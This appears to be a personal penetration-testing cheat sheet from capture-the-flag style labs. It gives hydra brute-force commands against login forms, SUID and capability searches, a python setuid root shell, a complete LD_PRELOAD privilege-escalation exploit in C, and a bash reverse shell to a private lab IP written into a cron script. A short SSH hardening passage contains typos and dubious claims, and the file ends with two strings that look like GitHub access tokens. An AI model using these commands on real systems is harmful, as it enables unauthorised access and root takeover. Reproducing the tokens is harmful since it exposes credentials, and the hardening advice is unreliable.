https://tools.nakanosec.com/csrf/


hydra -L usernames.txt -P passwords.txt -v 10.10.80.98 http-post-form "/login.php:username=^USER^&password=^PASS^:Please enter the correct credentials"     -which req usenmae and pass


  
hydra -l '' -P 3digits.txt -f -v 10.10.177.254 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000      only req pass



---------------------------------------------------------------------------------------------------------------------------------
SSH is the service that faces most of the outside attacks. Securing it is a top priority. Linux servers arrive from the manufacturer with SH services. There’s plenty here you can configure for increasing security, but these are what we recommend you to start from:

    SSH default port is Port 22. Port 22 is known to have several vulnerabilities, so you better change the default configurations.
    Make sure that the Root account is inaccessible using SSH.:

PermitRootLogn no

    Password authentication must be replaced with key-based authentication. All this can be configured from /etc/ssh/sshd_config
    Allow some specific users:

AllowUsers [Username]

 

This is just the tip of the ice when configuring SSH, and there is much more you can do. For example, some companies add banners to deter attackers and discourage them from continuing further.

Here are some additional options that you need to make sure exist in the “sshd_config” file:

----------------------------------------------------------------------------------------------------------------------------------

SOme important permissions 

find / -type f -name root.txt 2> /dev/null   finding a particular file


find / -user root -perm /4000
find / -type f -perm /4000     go out to main directory 


find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null


find / -user root -perm /4000
find / -type f -perm /4000     go out to main directory  
then check it then exploit it by the gftobins in SUID permissions 
find / -type f -perm -04000 -ls 2>/dev/null


getcap -r / 2>/dev/null
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'   -root access from above getid when python

python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm   --gives access to commands like clear   
____________________________________________________________________________________________________________________________________________________________________________________________

showmount -e <remote-ip>     Use the showmount command to see if the remote-machine is sharing anything across the network:


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                                   LD_PRELOAD env when sudo -l done

n command prompt type: sudo -l
2. From the output, notice that the LD_PRELOAD environment variable is intact.

Exploitation

1. Open a text editor and type:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
5. In command prompt type: id
_________________________________________________________________________________________________________________________________________________________________________________________

When the python shell is get using the terminal when you login into it 

other using the command __import__("os").system("$command to execute")

reverse shell command echo "bash -c 'bash -i >& /dev/tcp/10.17.88.198/1234 0>&1'" > root.sh
   root.sh is the crontab file 

______________________________________________________________________________________________________________________________________________________________________________________
different types of base to crack the code 

Base2	01100010 01110010 01100101 01100001 01101011 01101001 01110100
Base8	142 162 145 141 153 151 164
Base16	62 72 65 61 6b 69 74
Base32	MJZGKYLLNF2A====    Base32 > Base58 > Base16 > Base64
Base58	4jP4KDubX1
Base62	22udqyscMu
Base64	YnJlYWtpdA==
Base85	@WH$gCM@k
Base91	%zmfv;:YH
______________________________________________________________________________________________________________________________________________________________________________________


sudo ssh2john idrsa.id_rsa > id_rsa.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 


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


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